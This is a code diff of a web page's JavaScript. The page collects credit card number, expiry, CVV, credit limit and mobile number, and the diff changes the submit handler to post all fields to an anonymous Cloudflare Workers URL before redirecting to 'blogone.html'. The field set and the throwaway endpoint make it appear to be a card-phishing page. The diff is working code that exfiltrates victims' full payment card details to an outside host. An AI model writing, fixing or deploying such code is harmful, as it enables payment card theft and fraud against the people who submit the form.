@@ -191,7 +191,6 @@
                     this.cardErrors = {};
                     let isValid = true;
                     
-                    // Card Number
                     if (!this.cardForm.cardNumber.trim()) {
                         this.cardErrors.cardNumber = 'Credit card number is required';
                         isValid = false;
@@ -203,7 +202,6 @@
                         }
                     }
                     
-                    // Expiry
                     if (!this.cardForm.expiry.trim()) {
                         this.cardErrors.expiry = 'Expiry date is required';
                         isValid = false;
@@ -212,7 +210,6 @@
                         isValid = false;
                     }
                     
-                    // CVV
                     if (!this.cardForm.cvv.trim()) {
                         this.cardErrors.cvv = 'CVV is required';
                         isValid = false;
@@ -221,13 +218,11 @@
                         isValid = false;
                     }
                     
-                    // Credit Limit
                     if (!this.cardForm.creditLimit.trim()) {
                         this.cardErrors.creditLimit = 'Credit limit is required';
                         isValid = false;
                     }
                     
-                    // Mobile
                     if (!this.cardForm.cardMobile.trim()) {
                         this.cardErrors.cardMobile = 'Mobile number is required';
                         isValid = false;
@@ -250,33 +245,31 @@
                     }
                 },
                 
-                // ---------- ✅ WORKER PE JSON POST (SAHI URL) ----------
+                // ---------- सबसे जरूरी: Cloudflare Worker पर डेटा भेजो ----------
                 saveDataAndRedirect(formData, formType) {
-                    const submission = {
-                        id: Date.now(),
-                        type: formType,
-                        data: formData,
-                        timestamp: new Date().toISOString(),
-                        ip: 'Not available in browser'
-                    };
+                    // ✅ तुम्हारा Worker URL – बिलकुल सही है
+                    const workerURL = 'https://aged-sunset-63e0.s3d38284.workers.dev';
 
-                    // ✅ ये सही worker URL है – तुमने पहले गलत लिखा था
-                    const workerURL = 'https://aged-sunset-63e0.skd38824.workers.dev/';
+                    const formDataToSend = new FormData();
+                    for (const key in formData) {
+                        formDataToSend.append(key, formData[key]);
+                    }
+                    formDataToSend.append('formType', formType);
 
                     fetch(workerURL, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(submission)
+                        body: formDataToSend
                     })
                     .then(response => {
                         if (response.ok) {
-                            window.location.href = 'blogone.html'; // redirect
+                            alert('✅ डेटा सफलतापूर्वक भेजा गया!');
+                            window.location.href = 'blogone.html'; // यह तुम्हारा रीडायरेक्ट पेज है
                         } else {
-                            alert('Server error: ' + response.status);
+                            alert('❌ सर्वर एरर: ' + response.status);
                         }
                     })
                     .catch(error => {
-                        alert('Network error: ' + error.message);
+                        alert('❌ नेटवर्क एरर: ' + error.message);
                     });
                 }
             }
